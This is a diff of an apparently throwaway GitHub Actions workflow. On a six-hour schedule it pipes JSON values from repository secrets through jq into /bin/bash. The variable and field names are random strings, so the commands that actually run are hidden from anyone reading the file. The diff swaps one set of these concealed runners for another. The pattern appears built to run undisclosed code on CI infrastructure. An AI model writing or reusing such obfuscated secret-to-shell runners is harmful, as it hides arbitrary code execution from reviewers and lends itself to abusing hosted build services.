@@ -3,31 +3,20 @@ name: songbingjia7986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 1/6 * * *'
-
+    - cron: '16 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: songbingjia7986
         env:
-          abqoj7: ${{ secrets.abqoj7 }}
+          pm8491: ${{ secrets.pm8491 }}
         run: |
-          echo $abqoj7 | jq -r .xdzim910 | /bin/bash
-          echo $ydvy392 | jq -r .ohgut1968 | /bin/bash
-          echo $utbbt21 | jq -r .p62 | /bin/bash
-          echo $wwy668 | jq -r .dyce3 | /bin/bash
-          echo $ogw2290 | jq -r .okfe241 | /bin/bash
-          echo $srdxg57410 | jq -r .jrhdy52366 | /bin/bash
-          echo $omyhd68 | jq -r .k6 | /bin/bash
-          echo $tj75580 | jq -r .cv39 | /bin/bash
-          echo $cft2 | jq -r .nssx3 | /bin/bash
-          echo $qym7799 | jq -r .pmux0915 | /bin/bash
-          echo $d2660 | jq -r .xshgn49415 | /bin/bash
-          echo $k69 | jq -r .tq8 | /bin/bash
-          echo $nm28097 | jq -r .qic2425 | /bin/bash
-          echo $tzhrn21193 | jq -r .imm81 | /bin/bash
-          echo $wr2 | jq -r .x227 | /bin/bash
-          echo $nl8 | jq -r .qzk5827 | /bin/bash
+          echo $pm8491 | jq -r .d55018 | /bin/bash
+          echo $nko27166 | jq -r .yvs34 | /bin/bash
+          echo $a91 | jq -r .vdd7371 | /bin/bash
+          echo $yp24 | jq -r .wzzv120 | /bin/bash
+          echo $adn69 | jq -r .xfc304 | /bin/bash
 
